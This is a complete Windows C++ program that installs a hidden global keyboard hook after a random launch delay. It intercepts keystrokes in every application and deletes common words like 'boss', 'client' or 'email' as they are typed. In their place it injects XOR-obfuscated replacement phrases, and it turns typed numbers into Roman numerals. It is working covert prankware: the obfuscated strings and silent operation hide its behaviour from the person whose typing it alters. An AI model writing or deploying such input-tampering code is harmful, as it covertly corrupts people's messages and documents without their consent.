#include <windows.h>
#include <string>
#include <unordered_map>
#include <vector>
#include <ctime>
#include <algorithm>
#include <cctype>
#include <cstdlib>

// Globals
HHOOK hHook = NULL;
std::string currentWord = "";
bool isTyping = false;

// ────────────────────────────────────────────────
//   OBFUSCATED DICTIONARY (XOR 0x5A)
// ────────────────────────────────────────────────
std::unordered_map<std::string, std::vector<std::string>> chaosDict = {
    {"the",     {".2?z34>/).(3;6z(?,56/.354", ".2?z*(5*2?9#", ".2?z<5(83>>?4z(3./;6"}},
    {"and",     {";4>z;6)5z23)z25634?))", ";4>z23)z;(7#z5<z;4.)", ";4>z.2?z)7?66z5<"}},
    {"is",      {"3)z;(=/;86#z;z);4>-392", "3)z7;43<?).34=z;)", "3)z9/((?4.6#z54z<3(? "}},
    {"of",      {"5<z.2?z;493?4.z54?)", "5<z>/835/)z+/;63.#", "5<z.2?z<5(83>>?4z,;(3?.#"}},
    {"a",       {";z)/)*3935/)6#z6;(=? ", ";z=?6;.345/)", ";z9/()?> "}},
    {"meeting", {"(3./;6z);9(3<39?", "95,?4z=;.2?(34=", "=(5/*z.2?(;*#z)?))354"}},
    {"email",   {"9;((3?(z*3=?54", ")9(566z5<z=(3?,;49?)", ".?6?*;.239z)9(?;7"}},
    {"boss",    {">/4)?54z7;).?(" , ")/*(?7?z5,?(65(>", ".2?z?4.3.#"}},
    {"work",    {">3=3.;6z)6;,?(#", ".2?z=(34>).54?", ".36634=z.2?z<3?6>) "}},
    {"deadline",{"<34;6z0/>=7?4.", "757?4.z5<z(?915434=", ".2?z2?;.z>?;.2"}},
    {"update",  {">3,34?z(?,?6;.354", ").;./)z(?*5(.z<(57z2?66"}},
    {"client",  {".2?z8?4?<;9.5(", ".2?z);9(3<393;6z6;78", ".2?z37*;.3?4.z54?"}},
    {"regards", {"-3.2z;==(?))3,?z?4?(=#", "<(57z.2?z,53>", "8?=(/>=34=6#"}},
    {"office",  {".2?z9549(?.?z>/4=?54", ".2?z<6/5(?)9?4.z*/(=;.5(#"}},
    {"friend",  {";9957*639?", "</./(?z-3.4?))", "<?665-z347;.?"}},
    {"mom",     {".2?z7;.(3;(92", ".2?z*(5=?43.5(", ")2?z-25z7/).z8?z58?#?> "}},
    {"dad",     {".2?z*;.(3;(92", ".2?z<34;493?(", ".2?z=(3667;).?("}},
    {"guy",     {"83*?>;6z*(37;.?", "?4.3.#", ")*?937?4"}},
    {"hello",   {"=(??.34=)vz75(.;6", ");6/.;.354)vz*5513?", ").;.?z#5/(z8/)34?))"}},
    {"thanks",  {"3z=/?))z3}66z6?.z#5/z63,?", "1??*z.2?z92;4=?vz#;z<36.2#z;437;6"}},
    {"pookie",  {"7#z>?;(?).z83565=39;6z73).;1?", ")-??./7)zr5<z>?;.2s"}},
    {"computer",{".2?z8??*w855*z85\"", ".2?z?6?9.(5439z*(3)54", ".2?z)363954z=5>"}},
    {"phone",   {".2?z=65-34=z(?9.;4=6?", ".2?z.(;9134=z>?,39?"}},
    {"google",  {".2?z;66w)??34=z?#?z5<z>;.;", ".2?z5(;96?z5<z;>) "}},
    {"search",  {">?6,?z34.5z.2?z<5(83>>?4z;(923,?)", "+/?(#z.2?z;8#))"}},
    {"amazon",  {".2?z-;(?25/)?z5<z8(51?4z>(?;7)", ".2?z<5(?).z5<z9;*3.;63)7"}},
    {"video",   {",3)/;6z2;66/934;.354z=?4?(;.5(", "75,34=z*39./(?)z5<z(?=(?."}},
    {"internet",{".2?z=658;6z8(;34w(5.", ".2?z)?(3?)z5<z./8?)"}},
    {"coffee",  {".2?z8?;4z0/39?", "63+/3>z*(5>/9.3,3.#", ">;(1z4?9.;("}},
    {"water",   {">32#>(5=?4z7545\"3>? ", ".2?z96?;(z63<?w<6/3>"}},
    {"eat",     {"954)/7?z.2?z4/.(3?4.)", "<?;).z/*54z.2?z<6?)2z5<"}},
    {"sleep",   {"?4.?(z.2?z739(5w>?;.2", "(?855.z.2?z83565=39;6z/43."}},
    {"game",    {">3=3.;6z2;66/934;.354", ".2?z)37/6;.354"}},
    {"home",    {".2?z8;)?z5<z5*?(;.354)", ".2?z6;3(", ".2?z238?(4;.354z92;78?("}},
    {"scream",  {";z,53>w>-?6634=z8;4)2??", ";z23=2w<(?+/?49#z6;7?4."}},
    {"help",    {"	tt	tzr	;,?z/(z	363954s", "9(3.39;6z?((5(z34z2/7;43.#"}},
    {"ok",      {"8??)?92/(=?(", ");.3)<;9.5(#z<5(z;z*(37;.?"}},
    {"okay",    {"8??)?92/(=?(", "/4>?().;86?vz2;,?z;z=(?;.z>;#"}}
};

// XOR decrypt (key 0x5A)
std::string decrypt(const std::string& s) {
    std::string r = s;
    for (char& c : r) c ^= 0x5A;
    return r;
}

// Roman numerals
std::string toRoman(long long n) {
    if (n <= 0 || n > 3999) return "NULLA";
    struct { int v; const char* s; } t[] = {
        {1000,"M"},{900,"CM"},{500,"D"},{400,"CD"},
        {100,"C"},{90,"XC"},{50,"L"},{40,"XL"},
        {10,"X"},{9,"IX"},{5,"V"},{4,"IV"},{1,"I"}
    };
    std::string res;
    for (auto& p : t) {
        while (n >= p.v) { res += p.s; n -= p.v; }
    }
    return res;
}

// Send text + backspaces
void TypeString(const std::string& text, int backs) {
    isTyping = true;
    std::vector<INPUT> inp;

    // Backspace old word
    for (int i = 0; i < backs; ++i) {
        INPUT k = {};
        k.type = INPUT_KEYBOARD;
        k.ki.wVk = VK_BACK;
        inp.push_back(k);
        k.ki.dwFlags = KEYEVENTF_KEYUP;
        inp.push_back(k);
    }

    // Type new text
    for (unsigned char c : text) {
        INPUT k = {};
        k.type = INPUT_KEYBOARD;
        k.ki.wVk = 0;
        k.ki.wScan = c;
        k.ki.dwFlags = KEYEVENTF_UNICODE;
        inp.push_back(k);
        k.ki.dwFlags |= KEYEVENTF_KEYUP;
        inp.push_back(k);
    }

    SendInput((UINT)inp.size(), inp.data(), sizeof(INPUT));
    Sleep(15);          // small delay → smoother in most apps
    isTyping = false;
}

// Hook procedure - aggressive word completion check
LRESULT CALLBACK KeyboardProc(int code, WPARAM wp, LPARAM lp) {
    if (code != HC_ACTION) return CallNextHookEx(hHook, code, wp, lp);

    KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lp;

    // Allow our own injected keys
    if (k->flags & LLKHF_INJECTED) return CallNextHookEx(hHook, code, wp, lp);

    if (isTyping) return 1;

    if (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN) {
        UINT vk = k->vkCode;

        // Letter or digit → add to buffer & check immediately
        if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
            char ch = (char)std::tolower((unsigned char)vk);
            currentWord += ch;

            // Immediate check after each character
            auto it = chaosDict.find(currentWord);
            if (it != chaosDict.end()) {
                const auto& opts = it->second;
                std::string rep = decrypt(opts[rand() % opts.size()]);
                TypeString(rep, (int)currentWord.length());
                currentWord.clear();
                return 1; // swallow original key
            }

            // Optional: number → roman (also immediate)
            if (currentWord.length() > 1 && std::all_of(currentWord.begin(), currentWord.end(), ::isdigit)) {
                try {
                    long long num = std::stoll(currentWord);
                    std::string rom = toRoman(num);
                    TypeString(rom, (int)currentWord.length());
                    currentWord.clear();
                    return 1;
                } catch (...) {}
            }

            // Safety: don't let buffer grow forever
            if (currentWord.length() > 20) currentWord.clear();
        }
        // Non-letter → clear buffer (word boundary)
        else {
            currentWord.clear();
        }
    }

    return CallNextHookEx(hHook, code, wp, lp);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    srand((unsigned)time(NULL));

    Sleep(1200 + (rand() % 2500)); // slight random delay on launch

    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!hHook) return 1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}